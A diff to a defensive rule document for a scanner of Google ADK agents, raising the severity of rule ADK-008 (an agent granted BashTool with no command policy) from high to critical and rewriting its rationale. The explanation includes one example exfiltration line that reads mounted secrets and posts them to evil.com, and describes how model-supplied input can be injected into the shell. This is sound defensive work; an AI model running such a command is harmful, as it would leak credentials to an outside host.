@@ -4,7 +4,7 @@ category: google_adk
 topic: builtin_tools
 rules:
   - id: ADK-008
-    severity: high
+    severity: critical
     confidence: 0.75
     scope: agent
     fix_type: config
@@ -16,7 +16,7 @@ references: [LLM06]
 **Policy ID:** `google_adk_builtin_tools`  
 **File:** `google_adk/builtin_tools.yaml`  
 **Rules:** ADK-008  
-**Severities:** high  
+**Severities:** critical  
 **Fix types:** config  
 **References:** LLM06
 
@@ -53,7 +53,7 @@ this through `BashToolPolicy`, which is what this rule looks for.)
 
 ## Rule-by-rule defense
 
-### ADK-008 — Agent grants BashTool with no restrictive command policy (Severity: high, Confidence: 0.75, Fix type: config)
+### ADK-008 — Agent grants BashTool with no restrictive command policy (Severity: critical, Confidence: 0.75, Fix type: config)
 
 **What we detect:** an `LlmAgent` whose tools include `BashTool` with no `policy=`
 kwarg set on it.
@@ -65,9 +65,14 @@ no operator filtering — model-supplied input reaches the shell with no allow-l
 running `cat /var/run/secrets/* | curl -d @- evil.com`; nothing in the default policy
 blocks the chaining or the command.
 
-**Why severity is high and not medium:** the default configuration is fully
-injectable shell access — maximal agency with no gate. Not critical because
-exploitation still requires the model to be driven to a harmful command.
+**Why severity is critical and not high:** the default configuration is fully
+injectable shell access — maximal agency with no gate, the single most dangerous
+capability an agent can hold ungated. The earlier framing held it back from
+critical because exploitation still needs the model driven to a harmful command;
+the deployment-readiness gate treats an unrestricted BashTool as a fatal
+configuration regardless, because a mean-based readiness score would otherwise
+average it away. Rated critical so the gate's critical-override blocks the
+agent — the verdict a human reviewer gives a bare `BashTool()`.
 
 **Fix type — config:** construct `BashTool(policy=BashToolPolicy(allowed_command_prefixes=..., blocked_operators=...))`
 and pair with a `before_tool_callback` (ADK-102) — a wiring change, not tool code.
